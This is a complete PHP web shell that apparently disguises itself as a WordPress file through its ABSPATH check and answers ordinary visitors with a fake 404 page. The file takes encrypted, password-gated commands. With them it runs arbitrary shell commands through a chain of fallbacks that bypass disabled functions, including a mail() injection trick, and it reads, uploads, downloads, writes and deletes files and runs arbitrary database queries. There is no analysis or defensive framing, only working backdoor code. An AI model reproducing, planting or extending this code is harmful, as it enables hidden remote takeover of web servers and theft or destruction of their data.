<?php
if(!defined('ABSPATH'))define('ABSPATH',dirname(__FILE__).'/');
$_h='041c6c1cc7d8176243185976fa20b0dd';
$_r=file_get_contents('php://input');
if(!$_r){http_response_code(404);echo '<!DOCTYPE html><html><head><title>404</title></head><body><h1>Not Found</h1></body></html>';exit;}
$_d=json_decode($_r,true);
if(!$_d||empty($_d['d'])||empty($_d['iv'])||empty($_d['t'])||empty($_d['p'])){http_response_code(404);exit;}
if(md5($_d['p'])!==$_h){http_response_code(404);exit;}
if(isset($_d['ts'])&&abs(time()-(int)$_d['ts'])>300){http_response_code(404);exit;}
$_k=hash('sha256',$_d['p'],true);
$_pt=openssl_decrypt(base64_decode($_d['d']),'aes-256-gcm',$_k,OPENSSL_RAW_DATA,base64_decode($_d['iv']),base64_decode($_d['t']));
if(!$_pt){http_response_code(404);exit;}
$cmd=json_decode($_pt,true);
if(!is_array($cmd)||empty($cmd['type'])){http_response_code(404);exit;}
function _enc($data,$key){$j=json_encode($data,JSON_UNESCAPED_UNICODE);$iv=openssl_random_pseudo_bytes(12);$tg='';$e=openssl_encrypt($j,'aes-256-gcm',$key,OPENSSL_RAW_DATA,$iv,$tg);return json_encode(['d'=>base64_encode($e),'iv'=>base64_encode($iv),'t'=>base64_encode($tg)]);}
function _out($r,$k){header('Content-Type: application/json');echo _enc($r,$k);exit;}
$type=$cmd['type'];$a=$cmd['data']??[];
switch($type){
case 'ping':_out(['ok'=>true,'php'=>PHP_VERSION,'os'=>php_uname(),'cwd'=>getcwd(),'user'=>get_current_user(),'time'=>date('c')],$_k);break;
case 'info':$dis=ini_get('disable_functions')?:'';$caps=[];foreach(['proc_open','shell_exec','exec','system','passthru','popen'] as $fn)if(stripos($dis,$fn)===false&&function_exists($fn))$caps[]=$fn;foreach(['pcntl_fork','pcntl_exec','pcntl_waitpid'] as $fn)if(stripos($dis,$fn)===false&&function_exists($fn))$caps[]=$fn;if(function_exists('mail')&&stripos($dis,'mail')===false)$caps[]='mail';_out(['php'=>PHP_VERSION,'os'=>php_uname(),'cwd'=>getcwd(),'user'=>get_current_user(),'doc_root'=>$_SERVER['DOCUMENT_ROOT']??'','tmp'=>sys_get_temp_dir(),'disk_free'=>@disk_free_space('/'),'caps'=>$caps,'disabled'=>$dis],$_k);break;
case 'shell':$c=$a['cmd']??'';if(!$c)_out(['error'=>'no cmd'],$_k);$cwd=$a['cwd']??getcwd();$dis=strtolower(ini_get('disable_functions')?:'');$r=null;if(stripos($dis,'proc_open')===false&&function_exists('proc_open')){$p=@proc_open($c,[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']],$pp,$cwd);if(is_resource($p)){fclose($pp[0]);$o=stream_get_contents($pp[1]);$e=stream_get_contents($pp[2]);fclose($pp[1]);fclose($pp[2]);$r=['stdout'=>$o,'stderr'=>$e,'code'=>proc_close($p)];}}if(!$r&&stripos($dis,'shell_exec')===false&&function_exists('shell_exec')){$o=@shell_exec('cd '.escapeshellarg($cwd).' && '.$c.' 2>&1');$r=['stdout'=>$o?:'','code'=>0];}if(!$r&&stripos($dis,'exec')===false&&function_exists('exec')){@exec('cd '.escapeshellarg($cwd).' && '.$c.' 2>&1',$out,$rc);$r=['stdout'=>implode("\n",$out),'code'=>$rc];}if(!$r&&stripos($dis,'system')===false&&function_exists('system')){ob_start();@system('cd '.escapeshellarg($cwd).' && '.$c.' 2>&1',$rc);$r=['stdout'=>ob_get_clean(),'code'=>$rc];}if(!$r&&stripos($dis,'popen')===false&&function_exists('popen')){$h=@popen('cd '.escapeshellarg($cwd).' && '.$c.' 2>&1','r');if($h){$o=stream_get_contents($h);pclose($h);$r=['stdout'=>$o,'code'=>0];}}if(!$r&&function_exists('pcntl_fork')&&function_exists('pcntl_exec')&&function_exists('pcntl_waitpid')){$tmp=tempnam(sys_get_temp_dir(),'sh_');$pid=@pcntl_fork();if($pid===0){@chdir($cwd);$sh='/bin/sh';if(!file_exists($sh))$sh='/bin/bash';@pcntl_exec($sh,['-c','exec > '.$tmp.' 2>&1;'.$c]);exit(127);}elseif($pid>0){pcntl_waitpid($pid,$st);$r=['stdout'=>@file_get_contents($tmp)?:'','code'=>pcntl_wifexited($st)?pcntl_wexitstatus($st):-1];@unlink($tmp);}}if(!$r&&function_exists('mail')){$tmp=tempnam(sys_get_temp_dir(),'sh_');@mail('','','',$c.' > '.$tmp.' 2>&1');usleep(500000);$r=['stdout'=>@file_get_contents($tmp)?:'','code'=>0,'via'=>'mail'];@unlink($tmp);}
_out($r??['error'=>'blocked'],$_k);break;
case 'ls':$path=$a['path']??getcwd();if(!is_dir($path))_out(['error'=>'not dir'],$_k);$items=[];foreach(new DirectoryIterator($path) as $i){if($i->isDot())continue;$items[]=['n'=>$i->getFilename(),'t'=>$i->isDir()?'d':'f','s'=>$i->isFile()?$i->getSize():0];}_out(['path'=>$path,'items'=>$items],$_k);break;
case 'read':$f=$a['path']??'';if(!$f||!is_file($f))_out(['error'=>'404'],$_k);$c=file_get_contents($f,false,null,0,min(filesize($f),2097152));_out(['content'=>$c,'size'=>filesize($f)],$_k);break;
case 'write':$f=$a['path']??'';if(!$f)_out(['error'=>'no path'],$_k);$dir=dirname($f);if(!is_dir($dir))@mkdir($dir,0755,true);$b=file_put_contents($f,$a['content']??'');_out($b!==false?['ok'=>true,'bytes'=>$b]:['error'=>'fail'],$_k);break;
case 'upload':$f=$a['path']??'';$data=$a['data']??'';if(!$f||!$data)_out(['error'=>'need path+data'],$_k);$dir=dirname($f);if(!is_dir($dir))@mkdir($dir,0755,true);$b=file_put_contents($f,base64_decode($data));_out($b!==false?['ok'=>true,'bytes'=>$b]:['error'=>'fail'],$_k);break;
case 'download':$f=$a['path']??'';if(!$f||!is_file($f))_out(['error'=>'404'],$_k);_out(['data'=>base64_encode(file_get_contents($f)),'size'=>filesize($f)],$_k);break;
case 'find':$dir=$a['path']??getcwd();$pat=$a['pattern']??'*';$max=(int)($a['max']??500);$items=[];$cnt=0;$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir,FilesystemIterator::SKIP_DOTS));foreach($it as $f){if($cnt>=$max)break;if(fnmatch($pat,$f->getFilename())){$items[]=['path'=>$f->getPathname(),'size'=>$f->getSize()];$cnt++;}}
_out(['items'=>$items,'count'=>$cnt],$_k);break;
case 'db':$h2=$a['host']??'localhost';$u=$a['user']??'';$p=$a['pass']??'';$db=$a['db']??'';$sql=$a['sql']??'';if(!$sql)_out(['error'=>'no sql'],$_k);try{$pdo=new PDO("mysql:host=$h2;dbname=$db",$u,$p,[PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION]);$lc=strtolower(ltrim($sql));if(preg_match('/^(select|show|describe)\b/',$lc)){$st=$pdo->query($sql);_out(['rows'=>$st->fetchAll(PDO::FETCH_ASSOC)],$_k);}else{_out(['affected'=>$pdo->exec($sql)],$_k);}}catch(\Throwable $e){_out(['error'=>$e->getMessage()],$_k);}break;
case 'rm':$f=$a['path']??'';if(is_file($f))_out(['ok'=>@unlink($f)],$_k);_out(['error'=>'fail'],$_k);break;
default:_out(['error'=>'?'],$_k);}
